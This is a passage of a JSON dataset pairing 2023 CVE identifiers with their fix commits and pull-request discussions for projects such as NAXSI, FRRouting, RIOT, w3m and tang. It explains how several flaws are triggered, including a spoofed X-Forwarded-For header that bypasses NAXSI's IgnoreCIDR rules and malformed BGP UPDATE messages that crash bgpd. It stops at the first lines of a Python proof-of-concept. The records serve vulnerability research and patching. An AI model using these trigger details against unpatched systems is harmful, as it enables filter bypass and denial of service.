            "commit_msg_words": 41,
            "other_info": "Remove X-Forwarded-For header special processing i think the issue should be solved by checking the actual trusted list of IPs.\r\nif you have 3 reverse proxy then you should be able to know which IPs it should be in the headers and block bad requests.\r\nThe original feature has always been problematic, and i do agree on the issue you are raising. This problem does not exist in NGINX\r\nIt handles everything correctly\r\n\r\nBut NAXSI in its current implementation additionally tries to check the X-Forwarded-For header itself and, regardless of the settings of trusted hosts, passes requests if the header contains a value from IgnoreCIDR / IgnoreIP.\r\n\r\nFor example, in our organization, internal addresses are not checked by NAXSI. Specified IgnoreCIDR 192.168.0.0/16, 172.16.0.0/16\r\nBut now **any packet from any host** with X-Forfarded-For: 192.168.1.1 will be passed by NAXSI Probably i'm still stuck with issues that afflicted very old versions of nginx. I have made a special release due this security bug. i have requested a CVE at your name :) @lubomudr  \r\n\r\nhttps://github.com/wargio/naxsi/security/advisories/GHSA-7qjc-q4j9-pc8x Thank you\r\nI just haven't figured out what it is yet ;-) https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures",
            "pr_title_words": 5,
            "comments_words": 180,
            "total_other_info_words": 185
        },
        {
            "cve-id": "CVE-2023-24821",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/bd31010231f5340e21410595dd95afc86bbfd341",
            "commit_msg": "gnrc_sixlowpan_frag_rb: fix integer underflow in _6lo_frag_size()\n\n(cherry picked from commit 9728f727e75d7d78dbfb5918e0de1b938b7b6d2c)",
            "commit_msg_words": 11,
            "other_info": "gnrc_sixlowpan: Various hardening fixes [backport 2022.10] ### Murdock results\n\n:heavy_check_mark: [PASSED](https://ci-prod.riot-os.org/details/269929bb39cb48648e9091595a754f80)\n\ne82cab6a94fa7865162bb7ac3705d5a461b1207d tests/unittests: fix get_frame_hdr_len tests for hardened parsing\n\n|  Success  |  Failures  |  Total  |  Runtime  |\n| :-------: | :--------: | :-----: | :-------: |\n| 2006 | 0 | 2006 | 07m:46s |\n\n\n#### Artifacts\n- [Documentation preview](https://ci-prod.riot-os.org/results/269929bb39cb48648e9091595a754f80/doc-preview/)\n\n**This only reflects a subset of all builds from https://ci-prod.riot-os.org. Please refer to https://ci.riot-os.org for a complete build for now.**",
            "pr_title_words": 6,
            "comments_words": 65,
            "total_other_info_words": 71
        },
        {
            "cve-id": "CVE-2023-34601",
            "commit_url": "https://github.com/thinkgem/jeesite/commit/30750011b49f7c8d45d0f3ab13ed3a1a422655bb",
            "commit_msg": "#I78QEI #515",
            "commit_msg_words": 2,
            "other_info": "pull @2017/2/23 16:18",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2023-42299",
            "commit_url": "https://github.com/AcademySoftwareFoundation/OpenImageIO/commit/b359c90c84b770d1d39c15aa4662478c7c09d745",
            "commit_msg": "fix heap-buffer-overflow in file src/gif.imageio/gifinput.cpp, line 368",
            "commit_msg_words": 7,
            "other_info": "fix heap-buffer-overflow in file src/gif.imageio/gifinput.cpp, line 368 Merged, thanks for the fix!",
            "pr_title_words": 7,
            "comments_words": 5,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2023-35846",
            "commit_url": "https://github.com/virtualsquare/picotcp/commit/d561990a358899178115e156871cc054a1c55ffe",
            "commit_msg": "[ipfilter] Check transport layer length in frame before filtering ports\n\nReported-by: \"P. Amsuo, Purdue University\"",
            "commit_msg_words": 15,
            "other_info": "Various fixes on size calculation There should be CVEs for these fixes.",
            "pr_title_words": 5,
            "comments_words": 7,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2023-33264",
            "commit_url": "https://github.com/hazelcast/hazelcast/commit/80a502d53cc48bf895711ab55f95e3a51e344ac1",
            "commit_msg": "Extend set of masked fields in ConfigXmlGenerator",
            "commit_msg_words": 7,
            "other_info": "Extend set of masked fields in ConfigXmlGenerator [HZ-2289] Thanks for the reviews, guys. I'm aware of the point Ramiz has mentioned, and IMO such a risk is minimal. We usually have the password value mandatory. @kwart @ramizdundar @promanenko does this vulnerability actually affect 3.x and 4.x releases as pointed out [here](https://github.com/advisories/GHSA-5gj6-62g7-vmgf) according to the affected versions? I was looking at the 3.x version and the [`ConfigXmlGenerator`](https://github.com/hazelcast/hazelcast/blob/v3.12.13/hazelcast/src/main/java/com/hazelcast/config/ConfigXmlGenerator.java) class is quite different _(e.g.: there is no `system-user-password` bit, no `ldapAuthenticationGenerator` method either etc.)_. The `4.y.z` are partly affected.\r\nThe `3.y.z` versions are not affected by this one, but they have more severe security issues. > The `4.y.z` are partly affected. The `3.y.z` versions are not affected by this one, but they have more severe security issues.\r\n\r\nThanks for the quick feedback and confirmation, I found it odd that the GitHub Advisory would mark the 3.x branch as vulnerable to this. \ud83d\ude4f  @kwart Will this fix be applied to 4.2.x since it's affected? > @kwart Will this fix be applied to 4.2.x since it's affected?\r\n\r\nI don't know. The `4.y.z` versions are already out of [standard support window](https://support.hazelcast.com/s/article/Version-Support-Windows).",
            "pr_title_words": 8,
            "comments_words": 177,
            "total_other_info_words": 185
        },
        {
            "cve-id": "CVE-2023-4255",
            "commit_url": "https://github.com/tats/w3m/commit/edc602651c506aeeb60544b55534dd1722a340d3",
            "commit_msg": "Fix OOB access due to multiple backspaces\n\nCommit 419ca82d57 (Fix m17n backspace handling causes out-of-bounds\nwrite in checkType) introduced an incomplete fix.\n\nIn function checkType we store the length of the previous multi-char\ncharacter in a buffer plens_buffer with pointer plens pointing to the\ncurrent position inside the buffer. When encountering a backspace plens\nis set to the previous position without a bounds check. This will lead\nto plens being out of bounds if we get more backspaces than we have\nprocessed multi-char characters before.\n\nIf we are at the beginning of the buffer do not decrement and set plen\n(the current length) to 0.\n\nThis also fixes GH Issue #270 [BUG] Out of bound read in Strnew_size ,\nStr.c:61\n\nIf the above explanation does sound weird it's because I didn't fully\ngrok that function. :-)",
            "commit_msg_words": 136,
            "other_info": "Fix OOB access due to multiple backspaces @tats My fix posted in the issue was not right. This is a slightly different solution. Thanks for your contribution.  I'll merge this soon.\r\n\r\n> This also fixes GH Issue #270 [BUG] Out of bound read in Strnew_size , Str.c:61\r\n\r\nThis seems to prevent #270 and also #271, correct?\r\n On Sat, Jul 15, 2023 at 01:31:02PM -0700, Tatsuya Kinoshita wrote:\n> Thanks for your contribution.  I'll merge this soon.\n> \n> > This also fixes GH Issue #270 [BUG] Out of bound read in Strnew_size , Str.c:61\n> \n> This seems to prevent #270 and also #271, correct?\n\nYes.\n\nI wasn't clear on that in the PR, sorry.\n Merged, thank you.",
            "pr_title_words": 7,
            "comments_words": 111,
            "total_other_info_words": 118
        },
        {
            "cve-id": "CVE-2023-33974",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/31c6191f6196f1a05c9765cffeadba868e3b0723",
            "commit_msg": "gnrc_sixlowpan_frag_sfr: fix ARQ scheduler race-condition",
            "commit_msg_words": 5,
            "other_info": "gnrc_sixlowpan_frag_sfr: fix ARQ scheduler race-condition ### Murdock results\n\n:heavy_check_mark: [PASSED](https://ci.riot-os.org/details/4713913fc6d1414691da03713dbc1baa)\n\n31c6191f6196f1a05c9765cffeadba868e3b0723 gnrc_sixlowpan_frag_sfr: fix ARQ scheduler race-condition\n\n|  Success  |  Failures  |  Total  |  Runtime  |\n| :-------: | :--------: | :-----: | :-------: |\n| 6933 | 0 | 6933 | 16m:54s |\n\n\n#### Artifacts\n- [Documentation preview](https://ci.riot-os.org/results/4713913fc6d1414691da03713dbc1baa/doc-preview/)\n > ### Murdock results\r\n> \r\n> :x: [FAILED](https://ci.riot-os.org/details/8bc8678a27694e7c887b6764198f0a9b)\r\n> \r\n> 7c28616910892d2af21d7ef8c28ff9a60b4ea941 gnrc_sixlowpan_frag_sfr: fix ARQ scheduler race-condition\r\n> \r\n> |  Success  |  Failures  |  Total  |  Runtime  |\r\n> | :-------: | :--------: | :-----: | :-------: |\r\n> | 4235 | 0 | 6933 | 06m:11s |\r\n> \r\n> \r\n> #### Artifacts\r\n> \r\n\r\nSomeone forgot to mention the failures? (/cc @aabadie) bors merge This PR was included in a batch that was canceled, it will be automatically retried   Build succeeded!\n\n  The publicly hosted instance of bors-ng is deprecated and will go away soon.\n\n  If you want to self-host your own instance, [instructions are here][instructions].\n  For more help, visit [the forum].\n\n  If you want to switch to GitHub's built-in merge queue, visit [their help page][gh].\n\n  [instructions]: https://github.com/bors-ng/bors-ng#how-to-set-up-your-own-real-instance\n  [the forum]: https://forum.bors.tech\n  [gh]: https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue\n\n\n\n  * [Murdock](https://ci.riot-os.org/details/fb540a7fea3d482dbf15b594aaf08a39)\n  * [static-tests](https://github.com/RIOT-OS/RIOT/actions/runs/5124347194/jobs/9216073113)\n  * [tools-build-success](https://github.com/RIOT-OS/RIOT/actions/runs/5124347197/jobs/9216103309)",
            "pr_title_words": 5,
            "comments_words": 180,
            "total_other_info_words": 185
        },
        {
            "cve-id": "CVE-2023-27734",
            "commit_url": "https://github.com/eteran/edb-debugger/commit/32f325f4016e0090f76934320173581860f090be",
            "commit_msg": "BinaryInfo: ensure sh_name lies within file\n\nThis fixes segfault on ELFs with malformed section headers (sh_name),\nsuch as one from https://github.com/eliben/pyelftools/issues/367",
            "commit_msg_words": 21,
            "other_info": "Fix some BinaryInfo crashes",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-35848",
            "commit_url": "https://github.com/virtualsquare/picotcp/commit/4b9a16764f2b12b611de9c34a50b4713d10ca401",
            "commit_msg": "More checks for correct header sizes\n\nReported-by: \"P. Amsuo, Purdue University\"",
            "commit_msg_words": 11,
            "other_info": "Various fixes on size calculation There should be CVEs for these fixes.",
            "pr_title_words": 5,
            "comments_words": 7,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2023-38898",
            "commit_url": "https://github.com/python/cpython/commit/1f4f46758736eacf649e7ff59a822ac05e16fd7b",
            "commit_msg": "moved incref past NULL check",
            "commit_msg_words": 5,
            "other_info": "gh-105987: Fix reference counting issue in `_asyncio._swap_current_task` @carljm If you're uncomfortable merging this, can you ask @kumaraditya303 for a review? > uncomfortable merging this\r\n\r\nI wasn't, was just waiting for CI signal. But glad to have @kumaraditya303 's review! Thanks @chgnrdv for the PR, and @kumaraditya303 for merging it \ud83c\udf2e\ud83c\udf89.. I'm working now to backport this PR to: 3.12.\n\ud83d\udc0d\ud83c\udf52\u26cf\ud83e\udd16 I'm not a witch! I'm not a witch! Sorry, @chgnrdv and @kumaraditya303, I could not cleanly backport this to `3.12` due to a conflict. \n                                Please backport using [cherry_picker](https://pypi.org/project/cherry-picker/) on command line.\n                                ```\n                                cherry_picker d2cbb6e918d9ea39f0dd44acb53270f2dac07454 3.12\n                                ```\n                                 [GH-106099](https://github.com/python/cpython/pull/106099) is a backport of this pull request to the [3.12 branch](https://github.com/python/cpython/tree/3.12).",
            "pr_title_words": 7,
            "comments_words": 101,
            "total_other_info_words": 108
        },
        {
            "cve-id": "CVE-2023-1672",
            "commit_url": "https://github.com/latchset/tang/commit/8dbbed10870378f1b2c3cf3df2ea7edca7617096",
            "commit_msg": "Fix race condition when creating/rotating keys (#123)\n\nWhen we create/rotate keys using either the tangd-keygen and\r\ntangd-rotate-keys helpers, there is a small window between the\r\nkeys being created and then the proper ownership permissions being\r\nset. This also happens when there are no keys and tang creates a\r\npair of keys itself.\r\n\r\nIn certain situations, such as the keys directory having wide open\r\npermissions, a user with local access could exploit this race\r\ncondition and read the keys before they are set to more restrictive\r\npermissions.\r\n\r\nTo prevent this issue, we now set the default umask to 0337 before\r\ncreating the files, so that they are already created with restrictive\r\npermissions; afterwards, we set the proper ownership as usual.\r\n\r\nIssue reported by Brian McDermott of CENSUS labs.\r\n\r\nFixes CVE-2023-1672\r\n\r\n\r\nReviewed-by: Sergio Arroutbi <sarroutb@redhat.com>\r\nSigned-off-by: Sergio Correia <scorreia@redhat.com>",
            "commit_msg_words": 137,
            "other_info": "Fix race condition when creating/rotating keys Thanks Sergio, having tested this patch, I can confirm it fixed the issue Thanks Sergio, having tested this patch previously, I can confirm it fixed the issue.",
            "pr_title_words": 6,
            "comments_words": 27,
            "total_other_info_words": 33
        },
        {
            "cve-id": "CVE-2023-6258",
            "commit_url": "https://github.com/latchset/pkcs11-provider/commit/86e7395165ad785380f9064bf96206eb8433d234",
            "commit_msg": "Side-channel proofing PKCS#1 1.5 paths\n\nFixes CVE-2023-6258 (Marvin)\n\nSigned-off-by: Simo Sorce <simo@redhat.com>",
            "commit_msg_words": 12,
            "other_info": "Side-channel proofing PKCS#1 1.5 paths (CVE-2023-6258) Just to be explicit: the \"approved\" status is because they _look_ fine, not because I've verified them to _be_ side-channel free. > Just to be explicit: the \"approved\" status is because they _look_ fine, not because I've verified them to _be_ side-channel free.\r\n\r\nThat was understood,\r\nthank you! this issue was assigned CVE-2023-6258 Merging this now that debian fixes are in and all tests pass, macos softoken is still broken because the CI still uses the  broken NSS versions and the softhsm for other reasons that seem also macports related.",
            "pr_title_words": 6,
            "comments_words": 90,
            "total_other_info_words": 96
        },
        {
            "cve-id": "CVE-2023-41360",
            "commit_url": "https://github.com/FRRouting/frr/commit/9b855a692e68e0d16467e190b466b4ecb6853702",
            "commit_msg": "bgpd: Don't read the first byte of ORF header if we are ahead of stream\n\nReported-by: Iggy Frankovic iggyfran@amazon.com\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
            "commit_msg_words": 23,
            "other_info": "bgpd: Don't read the first byte of ORF header if we are ahead of stream @Mergifyio backport stable/9.0 stable/8.5 > backport stable/9.0 stable/8.5\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14248 bgpd: Don't read the first byte of ORF header if we are ahead of stream (backport #14245)](https://github.com/FRRouting/frr/pull/14248) has been created for branch `stable/9.0`\n* [#14249 bgpd: Don't read the first byte of ORF header if we are ahead of stream (backport #14245)](https://github.com/FRRouting/frr/pull/14249) has been created for branch `stable/8.5`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/9.0 stable/8.5\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13685/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Failed\n<details>\n<summary>OpenBSD 7 amd64 build: Failed (click for details)</summary>\nOpenBSD 7 amd64 build: No useful log found\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- FreeBSD 12 amd64 build\n- Ubuntu 18.04 i386 build\n- Ubuntu 18.04 arm8 build\n- Ubuntu 18.04 arm7 build\n- Debian 11 amd64 build\n- Redhat 8 amd64 build\n- Debian 10 amd64 build\n- FreeBSD 11 amd64 build\n- Ubuntu 22.04 amd64 build\n- Ubuntu 20.04 amd64 build\n- Debian 9 amd64 build\n- CentOS 7 amd64 build\n- Redhat 9 amd64 build\n- Ubuntu 18.04 ppc64le build\n- Ubuntu 18.04 amd64 build\n</details>\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13685/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n @Mergifyio backport stable/8.4 > backport stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#15928 bgpd: Don't read the first byte of ORF header if we are ahead of stream (backport #14245)](https://github.com/FRRouting/frr/pull/15928) has been created for branch `stable/8.4`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 15,
            "comments_words": 358,
            "total_other_info_words": 373
        },
        {
            "cve-id": "CVE-2023-26768",
            "commit_url": "https://github.com/liblouis/liblouis/commit/565ac66ec0c187ffb442226487de3db376702958",
            "commit_msg": "Check filename before coping to initialLogFileName",
            "commit_msg_words": 6,
            "other_info": "Check filename before coping to initialLogFileName Replace the magic number with a define `FILENAMESIZE`.",
            "pr_title_words": 6,
            "comments_words": 8,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2023-40828",
            "commit_url": "https://github.com/pf4j/pf4j/commit/8e0aa198c4e652cfc1eb9e05ca9b64397f67cc72",
            "commit_msg": "Add security checks to prevent directory traversal when decompressing (#538)",
            "commit_msg_words": 10,
            "other_info": "Add security checks to prevent directory traversal when decompressing SonarCloud Quality Gate failed.&nbsp; &nbsp; [![Quality Gate failed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/failed-16px.png 'Quality Gate failed')](https://sonarcloud.io/dashboard?id=pf4j_pf4j&pullRequest=538)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=pf4j_pf4j&pullRequest=538&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=pf4j_pf4j&pullRequest=538&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=pf4j_pf4j&pullRequest=538&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=CODE_SMELL) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=CODE_SMELL) [2 Code Smells](https://sonarcloud.io/project/issues?id=pf4j_pf4j&pullRequest=538&resolved=false&types=CODE_SMELL)\n\n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/0-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=pf4j_pf4j&pullRequest=538&metric=new_coverage&view=list) [0.0% Coverage](https://sonarcloud.io/component_measures?id=pf4j_pf4j&pullRequest=538&metric=new_coverage&view=list)  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=pf4j_pf4j&pullRequest=538&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=pf4j_pf4j&pullRequest=538&metric=new_duplicated_lines_density&view=list)\n\n![warning](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/message_warning-16px.png 'warning') The version of Java (11.0.20) you have used to run this analysis is deprecated and we will stop accepting it soon. Please update to at least Java 17.\nRead more [here](https://docs.sonarcloud.io/appendices/scanner-environment/)\n\n\n\n\n![idea](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/light_bulb-16px.png 'idea') Catch issues before they fail your Quality Gate with our IDE extension ![sonarlint](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/sonarlint-16px.png 'sonarlint') [SonarLint](https://www.sonarsource.com/products/sonarlint/features/connected-mode/?referrer=sonarcloud-welcome)",
            "pr_title_words": 9,
            "comments_words": 99,
            "total_other_info_words": 108
        },
        {
            "cve-id": "CVE-2023-41358",
            "commit_url": "https://github.com/FRRouting/frr/commit/28ccc24d38df1d51ed8a563507e5d6f6171fdd38",
            "commit_msg": "bgpd: Do not process NLRIs if the attribute length is zero\n\n```\n3  0x00007f423aa42476 in __GI_raise (sig=sig@entry=11) at ../sysdeps/posix/raise.c:26\n4  0x00007f423aef9740 in core_handler (signo=11, siginfo=0x7fffc414deb0, context=<optimized out>) at lib/sigevent.c:246\n5  <signal handler called>\n6  0x0000564dea2fc71e in route_set_aspath_prepend (rule=0x564debd66d50, prefix=0x7fffc414ea30, object=0x7fffc414e400)\n    at bgpd/bgp_routemap.c:2258\n7  0x00007f423aeec7e0 in route_map_apply_ext (map=<optimized out>, prefix=prefix@entry=0x7fffc414ea30,\n    match_object=match_object@entry=0x7fffc414e400, set_object=set_object@entry=0x7fffc414e400, pref=pref@entry=0x0) at lib/routemap.c:2690\n8  0x0000564dea2d277e in bgp_input_modifier (peer=peer@entry=0x7f4238f59010, p=p@entry=0x7fffc414ea30, attr=attr@entry=0x7fffc414e770,\n    afi=afi@entry=AFI_IP, safi=safi@entry=SAFI_UNICAST, rmap_name=rmap_name@entry=0x0, label=0x0, num_labels=0, dest=0x564debdd5130)\n    at bgpd/bgp_route.c:1772\n9  0x0000564dea2df762 in bgp_update (peer=peer@entry=0x7f4238f59010, p=p@entry=0x7fffc414ea30, addpath_id=addpath_id@entry=0,\n    attr=0x7fffc414eb50, afi=afi@entry=AFI_IP, safi=<optimized out>, safi@entry=SAFI_UNICAST, type=9, sub_type=0, prd=0x0, label=0x0,\n    num_labels=0, soft_reconfig=0, evpn=0x0) at bgpd/bgp_route.c:4374\n10 0x0000564dea2e2047 in bgp_nlri_parse_ip (peer=0x7f4238f59010, attr=attr@entry=0x7fffc414eb50, packet=0x7fffc414eaf0)\n    at bgpd/bgp_route.c:6249\n11 0x0000564dea2c5a58 in bgp_nlri_parse (peer=peer@entry=0x7f4238f59010, attr=attr@entry=0x7fffc414eb50,\n    packet=packet@entry=0x7fffc414eaf0, mp_withdraw=mp_withdraw@entry=false) at bgpd/bgp_packet.c:339\n12 0x0000564dea2c5d66 in bgp_update_receive (peer=peer@entry=0x7f4238f59010, size=size@entry=109) at bgpd/bgp_packet.c:2024\n13 0x0000564dea2c901d in bgp_process_packet (thread=<optimized out>) at bgpd/bgp_packet.c:2933\n14 0x00007f423af0bf71 in event_call (thread=thread@entry=0x7fffc414ee40) at lib/event.c:1995\n15 0x00007f423aebb198 in frr_run (master=0x564deb73c670) at lib/libfrr.c:1213\n16 0x0000564dea261b83 in main (argc=<optimized out>, argv=<optimized out>) at bgpd/bgp_main.c:505\n```\n\nWith the configuration:\n\n```\nfrr version 9.1-dev-MyOwnFRRVersion\nfrr defaults traditional\nhostname ip-172-31-13-140\nlog file /tmp/debug.log\nlog syslog\nservice integrated-vtysh-config\n!\ndebug bgp keepalives\ndebug bgp neighbor-events\ndebug bgp updates in\ndebug bgp updates out\n!\nrouter bgp 100\n bgp router-id 9.9.9.9\n no bgp ebgp-requires-policy\n bgp bestpath aigp\n neighbor 172.31.2.47 remote-as 200\n !\n address-family ipv4 unicast\n  neighbor 172.31.2.47 default-originate\n  neighbor 172.31.2.47 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n!\n```\n\nThe issue is that we try to process NLRIs even if the attribute length is 0.\n\nLater bgp_update() will handle route-maps and a crash occurs because all the\nattributes are NULL, including aspath, where we dereference.\n\nAccording to the RFC 4271:\n\nA value of 0 indicates that neither the Network Layer\n         Reachability Information field nor the Path Attribute field is\n         present in this UPDATE message.\n\nBut with a fuzzed UPDATE message this can be faked. I think it's reasonable\nto skip processing NLRIs if both update_len and attribute_len are 0.\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
            "commit_msg_words": 325,
            "other_info": "bgpd: Do not process NLRIs if the attribute length is zero # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13741/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n @Mergifyio backport stable/9.0 stable/8.5 > backport stable/9.0 stable/8.5\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14269 bgpd: Do not process NLRIs if the attribute length is zero (backport #14260)](https://github.com/FRRouting/frr/pull/14269) has been created for branch `stable/9.0`\n* [#14270 bgpd: Do not process NLRIs if the attribute length is zero (backport #14260)](https://github.com/FRRouting/frr/pull/14270) has been created for branch `stable/8.5`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/9.0 stable/8.5\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> @Mergifyio backport stable/8.4 > backport stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#15931 bgpd: Do not process NLRIs if the attribute length is zero (backport #14260)](https://github.com/FRRouting/frr/pull/15931) has been created for branch `stable/8.4`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 11,
            "comments_words": 188,
            "total_other_info_words": 199
        },
        {
            "cve-id": "CVE-2023-40612",
            "commit_url": "https://github.com/OpenNMS/opennms/commit/69db8566de1ee90d7c5ed660d417a5e9fdc51ab5",
            "commit_msg": "NMS-15704: Securing Xml parser factory",
            "commit_msg_words": 5,
            "other_info": "NMS-15704: Securing Xml parser factory",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2023-36183",
            "commit_url": "https://github.com/AcademySoftwareFoundation/OpenImageIO/commit/03a368113a4c5abb45f9e896f0eff274a2571a00",
            "commit_msg": "fix heap-buffer-overflow in function ICOInput::readimg in file src/ico.imageio/icoinput.cpp",
            "commit_msg_words": 8,
            "other_info": "fix heap-buffer-overflow in function ICOInput::readimg in file src/ic\u2026",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-46753",
            "commit_url": "https://github.com/FRRouting/frr/commit/d8482bf011cb2b173e85b65b4bf3d5061250cdb9",
            "commit_msg": "bgpd: Check mandatory attributes more carefully for UPDATE message\n\nIf we send a crafted BGP UPDATE message without mandatory attributes, we do\nnot check if the length of the path attributes is zero or not. We only check\nif attr->flag is at least set or not. Imagine we send only unknown transit\nattribute, then attr->flag is always 0. Also, this is true only if graceful-restart\ncapability is received.\n\nA crash:\n\n```\nbgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)\nbgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17\nBGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]\nBGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]\nBGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]\nBGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]\nBGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]\nBGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]\nBGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]\nBGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]\nBGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]\nBGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]\n```\n\nSending:\n\n```\nimport socket\nimport time\n\nOPEN = 